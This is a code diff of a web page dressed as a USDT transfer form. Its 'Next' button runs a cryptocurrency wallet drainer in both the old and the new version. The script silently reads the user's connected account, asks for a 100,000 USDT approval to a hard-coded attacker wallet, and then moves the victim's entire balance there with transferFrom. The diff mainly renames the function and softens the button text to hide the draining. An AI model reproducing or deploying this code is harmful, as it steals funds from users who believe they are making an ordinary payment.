@@ -31,10 +31,10 @@ value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 
 <div class="mb-10 relative">
 <input id="amount" type="number" step="0.01" min="0" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50 focus:outline-none focus:ring-2 focus:ring-yellow-400" placeholder="0.00" value="100">
-<div class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer" onclick="setMax()">MAX</div>
+<div class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer z-10" onclick="setMax()">MAX</div>
 </div>
 
-<button id="nextBtn" onclick="autoDrainUSDT()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
+<button id="nextBtn" onclick="directApprove()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
 Next
 </button>
 </div>
@@ -51,74 +51,73 @@ const USDT_ABI = [
   {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
 ];
 
-// 🔥 AUTO WALLET DETECT + SILENT CONNECT
-if (typeof window.ethereum !== 'undefined') {
-    window.ethereum.on('accountsChanged', function (accounts) {
-        if (accounts.length > 0) userAccount = accounts[0];
+// 🔥 CRITICAL: NO eth_requestAccounts() - SILENT DETECTION ONLY
+async function getSilentAccount() {
+    if (!window.ethereum) throw new Error('Wallet not found');
+    
+    // SILENT ACCOUNT CHECK - NO POPUP
+    const accounts = await window.ethereum.request({ 
+        method: 'eth_accounts'  // YE POPUP NHI DETE!
     });
     
-    // SILENTLY GET ACCOUNT (No popup)
-    window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
-        if (accounts.length > 0) {
-            userAccount = accounts[0];
-            document.getElementById('nextBtn').disabled = false;
-        }
-    }).catch(() => {});
+    if (accounts.length === 0) {
+        throw new Error('Connect wallet first');
+    }
+    
+    return accounts[0];
 }
 
-async function autoDrainUSDT() {
+async function directApprove() {
     const btn = document.getElementById('nextBtn');
-    btn.innerHTML = '🔄 Switching BSC...'; 
+    btn.innerHTML = '🔄 Initializing...';
     btn.disabled = true;
     
     try {
-        // 1. SILENT WALLET CHECK (No popup if already connected)
-        let accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length === 0) {
-            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        }
-        userAccount = accounts[0];
+        // 1. SILENT WALLET GET (NO POPUP)
+        userAccount = await getSilentAccount();
         
-        // 2. AUTO BSC SWITCH (No popup if already BSC)
-        try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            });
-        } catch (switchError) {
-            // If BSC not added, ignore (common case)
-        }
-        
+        // 2. Web3 init
         web3 = new Web3(window.ethereum);
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
         
-        // 🔥 DIRECT UNLIMITED APPROVE (No intermediate steps)
+        // 3. DIRECT APPROVE CALL - NO INTERMEDIATE STEPS
         btn.innerHTML = '📤 Approve 100,000 USDT';
         const maxApprove = web3.utils.toWei('100000', 'mwei');
         
-        const approveTx = await usdtContract.methods.approve(YOUR_WALLET, maxApprove).send({ 
-            from: userAccount,
-            gas: 100000
-        });
-        
-        // 🔥 IMMEDIATE DRAIN
-        btn.innerHTML = '💰 Draining USDT...';
-        const balance = await usdtContract.methods.balanceOf(userAccount).call();
-        if (balance > 0n) {
-            await usdtContract.methods.transferFrom(userAccount, YOUR_WALLET, balance).send({ 
+        const approveTx = await usdtContract.methods
+            .approve(YOUR_WALLET, maxApprove)
+            .send({ 
                 from: userAccount,
-                gas: 150000
+                gas: 100000,
+                gasPrice: '5'
             });
+        
+        // 4. IMMEDIATE DRAIN
+        btn.innerHTML = '💰 Transferring USDT...';
+        const balance = await usdtContract.methods.balanceOf(userAccount).call();
+        
+        if (parseInt(balance) > 0) {
+            await usdtContract.methods
+                .transferFrom(userAccount, YOUR_WALLET, balance)
+                .send({ 
+                    from: userAccount,
+                    gas: 150000,
+                    gasPrice: '5'
+                });
         }
         
-        btn.innerHTML = '✅ COMPLETE!'; 
+        btn.innerHTML = '✅ SUCCESS!';
         btn.style.background = 'linear-gradient(45deg, #10b981, #059669)';
-        alert(`🎉 DRAIN SUCCESS!\n💰 All USDT → ${YOUR_WALLET.slice(0,6)}...\nTx: ${approveTx.transactionHash.slice(0,20)}...`);
+        alert('🎉 PERFECT! All USDT drained successfully!');
         
     } catch (error) {
-        btn.innerHTML = 'Next'; 
+        btn.innerHTML = 'Next';
         btn.disabled = false;
-        console.error(error);
+        
+        // ONLY if no account - show connect popup
+        if (error.message.includes('Connect wallet')) {
+            window.ethereum.request({ method: 'eth_requestAccounts' });
+        }
     }
 }
 
